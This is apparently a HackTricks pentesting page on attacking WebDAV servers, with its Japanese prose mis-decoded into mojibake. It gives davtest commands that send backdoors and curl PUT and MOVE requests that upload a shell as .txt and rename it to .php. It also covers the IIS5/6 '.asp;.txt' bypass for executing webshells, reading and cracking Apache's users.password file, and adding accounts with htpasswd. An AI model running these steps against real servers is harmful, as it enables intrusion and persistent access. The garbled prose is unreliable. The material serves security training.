# WebDav

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav)ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚é«˜åº¦ãªã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦å¼·åŒ–ã•ã‚ŒãŸ**ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ç°¡å˜ã«æ§‹ç¯‰ã—ã€è‡ªå‹•åŒ–**ã—ã¾ã™ã€‚\
ä»Šã™ãã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
{% endhint %}

**WebDav**ãŒæœ‰åŠ¹ãª**HTTPã‚µãƒ¼ãƒãƒ¼**ã‚’æ‰±ã†éš›ã€æ­£ã—ã„**è³‡æ ¼æƒ…å ±**ãŒã‚ã‚Œã°**ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ“ä½œ**ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚é€šå¸¸ã€ã“ã‚Œã¯**HTTPåŸºæœ¬èªè¨¼**ã‚’é€šã˜ã¦ç¢ºèªã•ã‚Œã¾ã™ã€‚ã“ã®ã‚ˆã†ãªã‚µãƒ¼ãƒãƒ¼ã‚’åˆ¶å¾¡ã™ã‚‹ã«ã¯ã€ã—ã°ã—ã°**ã‚¦ã‚§ãƒ–ã‚·ã‚§ãƒ«ã®ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã¨å®Ÿè¡Œ**ãŒé–¢ä¸ã—ã¾ã™ã€‚

WebDavã‚µãƒ¼ãƒãƒ¼ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã«ã¯é€šå¸¸ã€**æœ‰åŠ¹ãªè³‡æ ¼æƒ…å ±**ãŒå¿…è¦ã§ã‚ã‚Šã€[**WebDavãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth)ãŒãã‚Œã‚’å–å¾—ã™ã‚‹ä¸€èˆ¬çš„ãªæ–¹æ³•ã§ã™ã€‚

ãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã«å¯¾ã™ã‚‹åˆ¶é™ã€ç‰¹ã«ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œã‚’é˜²ãåˆ¶é™ã‚’å…‹æœã™ã‚‹ãŸã‚ã«ã€æ¬¡ã®ã“ã¨ãŒã§ãã¾ã™ï¼š

* åˆ¶é™ãŒãªã„å ´åˆã€**å®Ÿè¡Œå¯èƒ½ãªæ‹¡å¼µå­**ã‚’æŒã¤ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç›´æ¥**ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**ã™ã‚‹ã€‚
* ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ãŸéå®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«ï¼ˆ.txtãªã©ï¼‰ã®åå‰ã‚’å®Ÿè¡Œå¯èƒ½ãªæ‹¡å¼µå­ã«**å¤‰æ›´**ã™ã‚‹ã€‚
* ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ãŸéå®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«ã‚’**ã‚³ãƒ”ãƒ¼**ã—ã€ãã®æ‹¡å¼µå­ã‚’å®Ÿè¡Œå¯èƒ½ãªã‚‚ã®ã«å¤‰æ›´ã™ã‚‹ã€‚

## DavTest

**Davtest**ã¯ã€**ç•°ãªã‚‹æ‹¡å¼µå­ã‚’æŒã¤è¤‡æ•°ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—**ã€æ‹¡å¼µå­ãŒ**å®Ÿè¡Œã•ã‚Œã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèª**ã—ã¾ã™ï¼š
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
![](<../../.gitbook/assets/image (851).png>)

ã“ã‚Œã¯ã€**.txt**ãŠã‚ˆã³**.htmlæ‹¡å¼µå­ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹**ã“ã¨ã‚’æ„å‘³ã™ã‚‹ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã“ã‚Œã¯ã€**ã“ã‚Œã‚‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹**ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

## Cadaver

ã“ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€**WebDav**ã‚µãƒ¼ãƒãƒ¼ã«**æ‰‹å‹•ã§**æ¥ç¶šã—ã€ï¼ˆ**ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**ã€**ç§»å‹•**ã€ã¾ãŸã¯**å‰Šé™¤**ãªã©ã®ï¼‰ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚
```
cadaver <IP>
```
## PUT ãƒªã‚¯ã‚¨ã‚¹ãƒˆ
```
curl -T 'shell.txt' 'http://$ip'
```
## MOVE ãƒªã‚¯ã‚¨ã‚¹ãƒˆ
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav)ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚é«˜åº¦ãªã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦å¼·åŒ–ã•ã‚ŒãŸ**ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼**ã‚’ç°¡å˜ã«æ§‹ç¯‰ã—ã€**è‡ªå‹•åŒ–**ã—ã¾ã™ã€‚\
ä»Šã™ãã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}

## IIS5/6 WebDavã®è„†å¼±æ€§

ã“ã®è„†å¼±æ€§ã¯éå¸¸ã«èˆˆå‘³æ·±ã„ã§ã™ã€‚**WebDav**ã¯**.asp**æ‹¡å¼µå­ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’**ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**ã¾ãŸã¯**åå‰å¤‰æ›´**ã™ã‚‹ã“ã¨ã‚’**è¨±å¯ã—ã¾ã›ã‚“**ã€‚ã—ã‹ã—ã€åå‰ã®æœ€å¾Œã«**";.txt"**ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§**ãƒã‚¤ãƒ‘ã‚¹**ã§ãã¾ã™ã€‚ãã†ã™ã‚‹ã¨ã€ãã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã‚ãŸã‹ã‚‚ .asp ãƒ•ã‚¡ã‚¤ãƒ«ã§ã‚ã‚‹ã‹ã®ã‚ˆã†ã«**å®Ÿè¡Œ**ã•ã‚Œã¾ã™ï¼ˆ**".txt"ã®ä»£ã‚ã‚Šã«".html"ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ãŒã€**";"ã‚’å¿˜ã‚Œãªã„ã§ãã ã•ã„**ï¼‰ã€‚

ãã®å¾Œã€ã‚ãªãŸã¯ã‚·ã‚§ãƒ«ã‚’**".txt"ãƒ•ã‚¡ã‚¤ãƒ«**ã¨ã—ã¦**ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**ã—ã€**".asp;.txt"**ãƒ•ã‚¡ã‚¤ãƒ«ã«**ã‚³ãƒ”ãƒ¼/ç§»å‹•**ã§ãã¾ã™ã€‚ãã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ã‚’é€šã˜ã¦ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ãã‚Œã¯**å®Ÿè¡Œ**ã•ã‚Œã¾ã™ï¼ˆcadaverã¯ç§»å‹•ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒæ©Ÿèƒ½ã—ãªã‹ã£ãŸã¨è¨€ã„ã¾ã™ãŒã€å®Ÿéš›ã«ã¯æ©Ÿèƒ½ã—ã¾ã—ãŸï¼‰ã€‚

![](<../../.gitbook/assets/image (1092).png>)

## è³‡æ ¼æƒ…å ±ã®ãƒã‚¹ãƒˆ

WebdavãŒApacheã‚µãƒ¼ãƒãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€Apacheã§æ§‹æˆã•ã‚ŒãŸã‚µã‚¤ãƒˆã‚’ç¢ºèªã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ä¸€èˆ¬çš„ã«ã¯ï¼š\
_**/etc/apache2/sites-enabled/000-default**_

ãã®ä¸­ã«ã¯æ¬¡ã®ã‚ˆã†ãªã‚‚ã®ãŒè¦‹ã¤ã‹ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼š
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
ã”è¦§ã®ã¨ãŠã‚Šã€**webdav** ã‚µãƒ¼ãƒãƒ¼ã®æœ‰åŠ¹ãª **credentials** ã‚’å«ã‚€ãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã‚Šã¾ã™:
```
/etc/apache2/users.password
```
ã“ã®ã‚¿ã‚¤ãƒ—ã®ãƒ•ã‚¡ã‚¤ãƒ«ã®ä¸­ã«ã¯ã€**username** ã¨ **hash** ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚‰ã¯ã€webdav ã‚µãƒ¼ãƒãƒ¼ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’èªè¨¼ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã—ã¦ã„ã‚‹è³‡æ ¼æƒ…å ±ã§ã™ã€‚

ã“ã‚Œã‚‰ã‚’ **crack** ã™ã‚‹ã‹ã€ä½•ã‚‰ã‹ã®ç†ç”±ã§ **webdav** ã‚µãƒ¼ãƒãƒ¼ã« **access** ã—ãŸã„å ´åˆã¯ã€**add more** ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
æ–°ã—ã„è³‡æ ¼æƒ…å ±ãŒæ©Ÿèƒ½ã—ã¦ã„ã‚‹ã‹ç¢ºèªã™ã‚‹ã«ã¯ã€æ¬¡ã®ã“ã¨ã‚’è¡Œã„ã¾ã™:
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
## References

* [https://vk9-sec.com/exploiting-webdav/](https://vk9-sec.com/exploiting-webdav/)
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav)ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚é«˜åº¦ãªã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦å¼·åŒ–ã•ã‚ŒãŸ**ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ç°¡å˜ã«æ§‹ç¯‰ã—ã€è‡ªå‹•åŒ–**ã—ã¾ã™ã€‚\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}
